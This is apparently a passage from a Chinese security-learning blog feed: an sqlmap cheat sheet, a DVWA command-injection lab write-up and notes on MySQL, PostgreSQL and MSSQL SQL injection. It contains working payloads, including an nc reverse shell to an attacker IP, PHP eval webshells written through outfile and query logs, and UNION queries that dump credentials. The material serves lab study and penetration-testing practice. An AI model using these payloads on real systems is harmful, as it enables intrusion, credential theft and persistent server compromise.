class="number">0</span>：只显示Python的回溯，错误和关键消息。 </span><br><span class="line">    <span class="number">1</span>：显示信息和警告消息。 </span><br><span class="line">    <span class="number">2</span>：显示调试消息。 </span><br><span class="line">    <span class="number">3</span>：有效载荷注入。 </span><br><span class="line">    <span class="number">4</span>：显示HTTP请求。 </span><br><span class="line">    <span class="number">5</span>：显示HTTP响应头。 </span><br><span class="line">    <span class="number">6</span>：显示HTTP响应页面的内容 </span><br><span class="line">--privileges  <span class="comment">#查看权限 </span></span><br><span class="line">--is-dba      <span class="comment">#是否是数据库管理员 </span></span><br><span class="line">--roles       <span class="comment">#枚举数据库用户角色 </span></span><br><span class="line">--udf-inject  <span class="comment">#导入用户自定义函数（获取系统权限） </span></span><br><span class="line">--union-check  <span class="comment">#是否支持union 注入 </span></span><br><span class="line">--union-cols <span class="comment">#union 查询表记录 </span></span><br><span class="line">--union-test <span class="comment">#union 语句测试 </span></span><br><span class="line">--union-<span class="keyword">use</span>  #采用<span class="title">union</span> 注入 </span><br><span class="line">--<span class="title">union</span>-<span class="title">tech</span> <span class="title">orderby</span> #<span class="title">union</span>配合<span class="title">order</span> <span class="title">by</span> </span><br><span class="line">--<span class="title">data</span> &quot;&quot; #<span class="title">POST</span>方式提交数据(--<span class="title">data</span> &quot;<span class="title">page</span>=1&amp;<span class="title">id</span>=2&quot;) </span><br><span class="line">--<span class="title">cookie</span> &quot;用;号分开<span class="string">&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) </span></span><br><span class="line"><span class="string">--referer &quot;</span><span class="string">&quot;     #使用referer欺骗(--referer &quot;</span>http:<span class="comment">//www.baidu.com&quot;) </span></span><br><span class="line">--user-agent <span class="string">&quot;&quot;</span>  <span class="comment">#自定义user-agent </span></span><br><span class="line">--proxy <span class="string">&quot;http://127.0.0.1:8118&quot;</span> <span class="comment">#代理注入 </span></span><br><span class="line">--<span class="keyword">string</span>=<span class="string">&quot;&quot;</span>    <span class="comment">#指定关键词,字符串匹配. </span></span><br><span class="line">--threads 　　  <span class="comment">#采用多线程(--threads 3) </span></span><br><span class="line">--sql-shell    <span class="comment">#执行指定sql命令 </span></span><br><span class="line">--sql-query    <span class="comment">#执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span></span><br><span class="line">--file-read    <span class="comment">#读取指定文件 </span></span><br><span class="line">--file-write   <span class="comment">#写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span></span><br><span class="line">--file-dest    <span class="comment">#要写入的文件绝对路径 </span></span><br><span class="line">--os-cmd=id    <span class="comment">#执行系统命令 </span></span><br><span class="line">--os-shell     <span class="comment">#系统交互shell </span></span><br><span class="line">--os-pwn       <span class="comment">#反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span></span><br><span class="line">--msf-path=    <span class="comment">#matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span></span><br><span class="line">--os-smbrelay  <span class="comment"># </span></span><br><span class="line">--os-bof       <span class="comment"># </span></span><br><span class="line">--reg-read     <span class="comment">#读取win系统注册表 </span></span><br><span class="line">--priv-esc     <span class="comment"># </span></span><br><span class="line">--time-sec=    <span class="comment">#延迟设置 默认--time-sec=5 为5秒 </span></span><br><span class="line">-p <span class="string">&quot;user-agent&quot;</span> --user-agent <span class="string">&quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;</span>  <span class="comment">#指定user-agent注入 </span></span><br><span class="line">--eta          <span class="comment">#盲注 </span></span><br><span class="line">/pentest/database/sqlmap/txt/</span><br><span class="line">common-columns.txt　　字段字典　　　 </span><br><span class="line">common-outputs.txt </span><br><span class="line">common-tables.txt      表字典 </span><br><span class="line">keywords.txt </span><br><span class="line">oracle-<span class="keyword">default</span>-passwords.txt </span><br><span class="line">user-agents.txt </span><br><span class="line">wordlist.txt </span><br></pre></td></tr></table></figure><h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 </span></span><br><span class="line"><span class="number">2</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 </span></span><br><span class="line"><span class="number">3</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 </span></span><br><span class="line"><span class="number">4</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs </span></span><br><span class="line"><span class="number">5</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span></span><br><span class="line"><span class="number">6</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 </span></span><br><span class="line"><span class="number">7</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span></span><br><span class="line"><span class="number">8</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 </span></span><br><span class="line"><span class="number">9</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span></span><br><span class="line"><span class="number">10</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span></span><br><span class="line"><span class="number">11</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 </span></span><br><span class="line"><span class="number">12</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 </span></span><br><span class="line"><span class="number">13</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span></span><br><span class="line"><span class="number">14</span>./sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --eta </span></span><br><span class="line"><span class="number">15</span>./sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;</span> -p id --prefix <span class="string">&quot;&#x27;)&quot;</span> --suffix <span class="string">&quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;</span></span><br><span class="line"><span class="number">16</span>./sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</span> --auth-type Basic --auth-cred <span class="string">&quot;testuser:testpass&quot;</span></span><br><span class="line"><span class="number">17</span>./sqlmap.py -l burp.log --scope=<span class="string">&quot;(www)?\.target\.(com|net|org)&quot;</span></span><br><span class="line"><span class="number">18</span>./sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</span> --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v <span class="number">3</span> </span><br><span class="line"><span class="number">19</span>./sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</span> --sql-query <span class="string">&quot;SELECT &#x27;foo&#x27;&quot;</span> -v <span class="number">1</span> </span><br><span class="line"><span class="number">20</span>./sqlmap.py -u <span class="string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --common-tables -D testdb --banner </span><br><span class="line"><span class="number">21</span>./sqlmap.py -u <span class="string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot;</span> --<span class="keyword">string</span>=<span class="string">&#x27;xx&#x27;</span> --dbs --level=<span class="number">3</span> -p <span class="string">&quot;uid&quot;</span></span><br></pre></td></tr></table></figure><h3 id="简单的注入流程"><a href="#简单的注入流程" class="headerlink" title="简单的注入流程"></a>简单的注入流程</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">能实现接触到登录或者授权的注入地址</span><br><span class="line">-u 是按照自身的请求头去跑，可能什么都没有</span><br><span class="line">特定访问数据包：访问数据包封装到一个txt文件后，进行如下执行：</span><br><span class="line">sqlmap -r <span class="number">1</span>.txt</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span></span><br><span class="line"><span class="number">2</span>.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span></span><br><span class="line">sqlmap -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span></span><br><span class="line"><span class="number">3</span>.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span></span><br><span class="line">sqlmap -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span></span><br><span class="line"><span class="number">4</span>.获取所有数据库 </span><br><span class="line">sqlmap -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 --dbs -v 2 </span></span><br><span class="line"><span class="number">5</span>.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span></span><br><span class="line"><span class="number">6</span>.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span></span><br><span class="line"><span class="number">7</span>.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span></span><br><span class="line"><span class="number">8</span>.file-read读取web文件 </span><br><span class="line">sqlmap -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span></span><br><span class="line"><span class="number">9</span>.file-write写入文件到web </span><br><span class="line">sqlmap -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</span></span><br></pre></td></tr></table></figure><p>个人结论：Centos环境搭建迅速，比本机的环境稳定多了。原因是因为win11环境经常出各种问题，导致各种崩坏，兴许我是萌新，懂的不多吧。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
            <tag> tool </tag>
            
            <tag> SQLMAP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-016-DVWA-Command Injection</title>
      <link href="/2023/05/19/CTF-web-016/"/>
      <url>/2023/05/19/CTF-web-016/</url>
      
        <content type="html"><![CDATA[<h1 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="comment">//确定OS并执行ping命令。</span></span><br><span class="line">    <span class="comment">// php_uname( &#x27;s&#x27; ):返回操作系统名称</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="comment">// 直接返回CMD命令执行结果--&gt;注入点</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>尝试使用反弹命令，使得CMD将权限反弹出来。但是这不是pikachu靶场，无法实现ncat反弹shell的命令(docker环境的不完整性)，能执行的仅仅是实现简单的恶意语句执行。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">注意：</span><br><span class="line"><span class="number">1</span>.这个环境实现的是Ping操作，所以说输入IP地址相当于使用了 <span class="string">&#x27;ping IP地址&#x27;</span>的操作</span><br><span class="line"><span class="number">2</span>.使用Ifconfig还是Ipconfig取决于当前系统环境</span><br><span class="line"></span><br><span class="line">连接字符 | || &amp; &amp;&amp;</span><br><span class="line"></span><br><span class="line">无论是否为<span class="literal">true</span>/<span class="literal">false</span>，优先执行后面的语句</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> | ifconfig</span><br><span class="line"></span><br><span class="line">无论是否为<span class="literal">true</span>/<span class="literal">false</span>，ping ip的操作和ifconfig的操作都将被执行一遍.</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> &amp; ifconfig</span><br><span class="line"></span><br><span class="line">当ping IP执行为<span class="literal">false</span>时，执行后面的ifconfig</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> || ifconfig</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> &amp;&amp; ifconfig</span><br></pre></td></tr></table></figure><p><img src="a1.jpg" alt="基础中的基础"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 反弹shell打法</span></span><br><span class="line"><span class="comment"># 在那个输入IP地址的搜索框输入下面命令</span></span><br><span class="line"><span class="comment"># 命令的意思是：将DVWA服务器命令行窗口（黑窗）主动给出到服务器地址为192.168.10.100的主机的5566端口上</span></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>|nc -e /bin/bash <span class="number">192.168</span>.<span class="number">10.100</span> <span class="number">5566</span></span><br><span class="line"><span class="comment"># 在攻击方192.168.10.100处使用nc工具监听5566端口</span></span><br><span class="line">nc -lvvp <span class="number">5566</span></span><br><span class="line">下面是最明显的回显</span><br></pre></td></tr></table></figure><p><img src="a2.jpg" alt="反弹shell"></p>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0016-WEB攻防-07-通用漏洞之SQL数据库-PostgreSQL/PostgreSQL</title>
      <link href="/2023/05/18/SEC-Study-0044/"/>
      <url>/2023/05/18/SEC-Study-0044/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p>1、SQL注入-MYSQL数据库<br>2、SQL注入-MSSQL数据库（SqlServer）<br>3、SQL注入-PostgreSQL数据库</p><h1 id="详细点："><a href="#详细点：" class="headerlink" title="详细点："></a>详细点：</h1><p><a href="https://www.cnblogs.com/blacksunny/p/8060028.html">数据库load_file()读取操作</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">高低权限注入漏洞的影响：</span><br><span class="line"></span><br><span class="line">- 后期注入漏洞的利用</span><br><span class="line">- 高低权 限数据库的区别：</span><br><span class="line">- 低权限数据库只能猜解</span><br><span class="line">- <span class="number">1</span>.可暴力猜解</span><br><span class="line">- <span class="number">2</span>.根据用户数据库特性查询表名列名等数据，得到需要猜测的数据</span><br><span class="line">- <span class="number">3</span>.只能用于获取服务器后台的操作权限，而不能获取服务器的操作权限</span><br><span class="line">- 高权限数据库能</span><br><span class="line">- 可以执行跨库注入</span><br><span class="line">- 可以升级为读写和执行的操作</span><br><span class="line">- 除了access外所有的数据库都支持高权限注入 </span><br><span class="line">- 理论上提升操作除了access外所有的数据库都可行</span><br><span class="line">- 实战：可能遇到升级失败的情况</span><br><span class="line">- 权限限制</span><br><span class="line">- 数据库内禁止权限</span><br><span class="line">- 思路：</span><br><span class="line">- 获取数据库核心数据</span><br><span class="line">- 文件读写与命令执行</span><br><span class="line">- 注意：</span><br><span class="line">- 拿下后台不等于拿下权限，需要进行权限提升才能拿到目标权限</span><br><span class="line">- 读写执行可以写入后门到网站</span><br><span class="line">- 命令执行用来反弹webshell等操作</span><br><span class="line">- 高权限数据库支持低权限数据库所能做的一切操作</span><br><span class="line">- 实战情况可能有所不同</span><br><span class="line">- 数据库简单限制以及防护导致读写或者命令执行=&gt;绕不过直接放弃</span><br><span class="line"></span><br><span class="line">高权限数据库与低权限数据库的成因</span><br><span class="line">- 当前网站脚本连接数据库时所使用的用户账户权限</span><br><span class="line">- 连接的对象是否为高用户会限制权限执行</span><br></pre></td></tr></table></figure><h1 id="MYSQL-root高权限读写注入"><a href="#MYSQL-root高权限读写注入" class="headerlink" title="MYSQL-root高权限读写注入"></a>MYSQL-root高权限读写注入</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- load_file文件读取操作： </span><br><span class="line">- 必须满足的条件</span><br><span class="line"><span class="number">1</span>、文件权限：chmod a+x pathtofile</span><br><span class="line">必须有权限读取并且文件必须完全可读。</span><br><span class="line"><span class="keyword">and</span> (select <span class="title function_ invoke__">count</span>(*) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span> <span class="comment">/*如果结果返回正常，说明具有读写权限.*/</span></span><br><span class="line"><span class="keyword">and</span> (select <span class="title function_ invoke__">count</span>(*) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span> <span class="comment">/* 返回错误，应该是管理员给数据库账户降权了*/</span></span><br><span class="line"><span class="number">2</span>、文件大小: 必须小于max_allowed_packet</span><br><span class="line"><span class="number">3</span>、必须使用完整路径</span><br><span class="line">- 当提交一个错误的查询时，如果display_errors=on，</span><br><span class="line">程序就会暴露web目录的绝对路径</span><br><span class="line">- phpinfo,报错,字典等获取完整路径</span><br><span class="line">- 读取配执性文件</span><br><span class="line"></span><br><span class="line">- 使用：</span><br><span class="line">select <span class="title function_ invoke__">load_file</span>(<span class="string">&#x27;d:/www/index.php&#x27;</span>);</span><br><span class="line">- 功能</span><br><span class="line">- 实现服务器上的任意文件读取</span><br><span class="line">- 读取有价值的配置性文件，例如conn.php</span><br><span class="line">- 读取操作一般是绝对路径，</span><br><span class="line">一般路径写法为：D:/<span class="number">1</span>.txt</span><br><span class="line">或者D:\\<span class="number">1</span>.txt</span><br><span class="line">或者不在乎转义的写法：D:\<span class="number">1</span>.txt</span><br><span class="line">- 对应限制</span><br><span class="line">- 限制文件读取：</span><br><span class="line">- mysql配置文件my.ini</span><br><span class="line">- secure-file-priv=C:/ =&gt; 限制文件读取写入</span><br><span class="line">- 突破secure-file-priv无法写入限制：</span><br><span class="line">- 利用phpmyadmin写shell</span><br><span class="line">- 突破的关键点在于建立sql语句执行的地方</span><br><span class="line">- 连接phpmyadmin接口-&gt; 尝试登录并且进入后就能获取mysql执行环境</span><br><span class="line">- 利用日志写shell</span><br><span class="line">- 执行处：</span><br><span class="line">- URL的SQL注入点</span><br><span class="line">- 直接连接上对方数据库，登录后执行操作</span><br><span class="line">- 来源</span><br><span class="line">- https:<span class="comment">//www.cnblogs.com/c1e4r/articles/8902444.html</span></span><br><span class="line">- set <span class="keyword">global</span> show_query_log=<span class="number">1</span>;</span><br><span class="line">- 启用慢查询日志/开启日志记录</span><br><span class="line">- set <span class="keyword">global</span> show_query_log_file=<span class="string">&quot;shell路径&quot;</span>;</span><br><span class="line">- 伪造/修改日志文件的绝对路径以及文件名</span><br><span class="line">- 指定文件路径</span><br><span class="line">- select <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> <span class="keyword">or</span> <span class="title function_ invoke__">sleep</span>(<span class="number">11</span>);</span><br><span class="line">- 向日志写入shell</span><br><span class="line">- 也可以写入一句话木马</span><br><span class="line">- <span class="number">127.0</span>.<span class="number">0.1</span>/shell.php</span><br><span class="line">- 尝试访问，正常回显<span class="title function_ invoke__">phpinfo</span>()则成功</span><br><span class="line">- 查看服务器默认慢查询时间值</span><br><span class="line">- show <span class="keyword">global</span> variables like <span class="string">&#x27;%long_query_time%&#x27;</span></span><br><span class="line"></span><br><span class="line">- </span><br><span class="line"></span><br><span class="line">- 自带的文件写入操作</span><br><span class="line">可以使用Hex编码将后门写入进去，再使用菜刀进行连接</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">- select <span class="string">&#x27;写入的内容&#x27;</span> into <span class="title function_ invoke__">downfile</span>(<span class="string">&#x27;D:/1.txt&#x27;</span>)</span><br><span class="line">- select <span class="string">&#x27;写入的内容&#x27;</span> into <span class="title function_ invoke__">outfile</span>(<span class="string">&#x27;D:/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><p>简述：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- 读取文件：</span><br><span class="line">    UNION SELECT <span class="number">1</span>,<span class="title function_ invoke__">load_file</span>(<span class="string">&#x27;d:/w.txt&#x27;</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span></span><br><span class="line">- 写入文件：</span><br><span class="line">    UNION SELECT <span class="number">1</span>,<span class="string">&#x27;xxxx&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span> into outfile <span class="string">&#x27;d:/www.txt&#x27;</span></span><br><span class="line">-路径获取：</span><br><span class="line">    phpinfo,报错,字典等</span><br><span class="line">-无法写入：</span><br><span class="line">    secure_file_priv突破 注入中需要支持SQL执行环境，没有就需要借助phpmyadmin或能够直接连上对方数据库进行绕过</span><br><span class="line"></span><br><span class="line">    set <span class="keyword">global</span> slow_query_log=<span class="number">1</span>;</span><br><span class="line">    set <span class="keyword">global</span> slow_query_log_file=<span class="string">&#x27;shell路径&#x27;</span>;</span><br><span class="line">    select <span class="string">&#x27;&lt;?php eval($_GET[A])?&gt;&#x27;</span> <span class="keyword">or</span> <span class="title function_ invoke__">SLEEP</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h1 id="PostgreSQL-高权限读写注入"><a href="#PostgreSQL-高权限读写注入" class="headerlink" title="PostgreSQL-高权限读写注入"></a>PostgreSQL-高权限读写注入</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- 测列数：</span><br><span class="line">order by <span class="number">4</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line">- 测显位：第<span class="number">2</span>，<span class="number">3</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="string">&#x27;null&#x27;</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span> 错误</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="literal">null</span>,<span class="string">&#x27;null&#x27;</span>,<span class="literal">null</span>,<span class="literal">null</span> 正常</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="literal">null</span>,<span class="literal">null</span>,<span class="string">&#x27;null&#x27;</span>,<span class="literal">null</span> 正常</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="string">&#x27;null&#x27;</span> 错误</span><br><span class="line">- 获取信息：版本，当前用户，当前数据库名</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> UNION SELECT <span class="literal">null</span>,<span class="title function_ invoke__">version</span>(),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> UNION SELECT <span class="literal">null</span>,current_user,<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="literal">null</span>,<span class="title function_ invoke__">current_database</span>(),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line">- 获取数据库名：</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="literal">null</span>,<span class="title function_ invoke__">string_agg</span>(datname,<span class="string">&#x27;,&#x27;</span>),<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> pg_database</span><br><span class="line">- 获取表名：</span><br><span class="line"><span class="number">1</span>、<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="literal">null</span>,<span class="title function_ invoke__">string_agg</span>(tablename,<span class="string">&#x27;,&#x27;</span>),<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> pg_tables where schemaname=<span class="string">&#x27;public&#x27;</span></span><br><span class="line"><span class="number">2</span>、<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="literal">null</span>,<span class="title function_ invoke__">string_agg</span>(relname,<span class="string">&#x27;,&#x27;</span>),<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> pg_stat_user_tables</span><br><span class="line">-获取列名：</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="literal">null</span>,<span class="title function_ invoke__">string_agg</span>(column_name,<span class="string">&#x27;,&#x27;</span>),<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;reg_users&#x27;</span></span><br><span class="line">- 获取数据：</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="literal">null</span>,<span class="title function_ invoke__">string_agg</span>(name,<span class="string">&#x27;,&#x27;</span>),<span class="title function_ invoke__">string_agg</span>(password,<span class="string">&#x27;,&#x27;</span>),<span class="literal">null</span> <span class="keyword">from</span> reg_users</span><br><span class="line">- 补充-获取dba用户（同样在DBA用户下，是可以进行文件读写的）：（判断是不是管理员账户，查询超级用户）</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="literal">null</span>,<span class="title function_ invoke__">string_agg</span>(usename,<span class="string">&#x27;,&#x27;</span>),<span class="literal">null</span>,<span class="literal">null</span> FROM pg_user WHERE usesuper IS <span class="literal">TRUE</span></span><br><span class="line">参考：https:<span class="comment">//www.freebuf.com/sectool/249371.html -&gt;文件读写的</span></span><br></pre></td></tr></table></figure><h1 id="MSSQL-sa高权限读写执行注入"><a href="#MSSQL-sa高权限读写执行注入" class="headerlink" title="MSSQL-sa高权限读写执行注入"></a>MSSQL-sa高权限读写执行注入</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- 测列数：</span><br><span class="line">order by <span class="number">4</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union all select <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line">- 测显位：</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union all select <span class="literal">null</span>,<span class="number">1</span>,<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union all select <span class="literal">null</span>,<span class="literal">null</span>,<span class="string">&#x27;s&#x27;</span>,<span class="literal">null</span></span><br><span class="line">- 获取信息：</span><br><span class="line">@@version 获取版本信息</span><br><span class="line"><span class="title function_ invoke__">db_name</span>() 当前数据库名字</span><br><span class="line">user、system_user,current_user,user_name 